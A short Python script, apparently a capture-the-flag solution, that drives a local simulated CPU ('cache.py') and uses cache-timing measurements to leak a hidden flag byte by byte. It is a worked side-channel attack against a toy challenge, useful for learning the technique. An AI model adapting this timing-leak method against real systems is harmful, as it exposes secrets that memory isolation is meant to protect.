import subprocess

MEM_SIZE = 256
CACHE_SIZE = 32


def issue_cmd(proc, cmd):
    proc.stdin.write('{}\n'.format(cmd))
    proc.stdin.flush()
    return float(proc.stdout.readline().strip())


def get_flag(proc):
    flag = []
    for addr in range(256):
        curr_base = 0
        issue_cmd(proc, 'mvl a {}'.format(addr))
        issue_cmd(proc, 'ldi b a')
        issue_cmd(proc, 'clear')
        while (curr_base + CACHE_SIZE) < MEM_SIZE:
            for index in range(CACHE_SIZE):
                guess = curr_base + index
                issue_cmd(proc, 'ld d {}'.format(guess))
            x = issue_cmd(proc, 'ldi c b')
            if x < .05:
                for index in range(CACHE_SIZE):
                    guess = index + curr_base
                    issue_cmd(proc, 'mvl a {}'.format(addr))
                    issue_cmd(proc, 'ldi b a')
                    issue_cmd(proc, 'clear')
                    issue_cmd(proc, 'ldi c b')
                    x = issue_cmd(proc, 'ld d {}'.format(guess))
                    if x < .05:
                        if guess == 0:
                            return ''.join(flag)
                        print(chr(guess))
                        flag.append(chr(guess))
                        break
                break
            curr_base += CACHE_SIZE


def main():
    proc = subprocess.Popen(['python', './cache.py'], stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE)
    flag = get_flag(proc)
    print(flag)
    proc.kill()


if __name__ == '__main__':
    main()
